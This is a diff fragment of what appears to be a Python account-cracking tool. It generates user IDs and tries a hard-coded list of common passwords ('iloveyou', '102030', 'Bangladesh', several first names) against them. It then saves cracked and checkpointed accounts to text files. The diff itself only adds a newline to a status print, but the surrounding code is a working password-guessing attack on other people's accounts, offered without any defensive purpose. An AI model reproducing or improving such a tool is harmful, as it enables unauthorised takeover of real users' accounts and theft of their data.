@@ -154,7 +154,7 @@ def fuck():
             uid = code+name+cod+love
             pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790','jannat','nusrat','sadia1','sadiya','fuck you','fuckyou','sumaiya','fariya']
             yaari.submit(DEVHIS2,uid,pwx,tl)
-    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(' ┏━[•] Crack process has been completed')
     print(' ┣━[•] OK Ids saved in DEVHIS-OK.txt')
     print(' ┗━[•] CP Ids saved in DEVHIS-CP.txt')
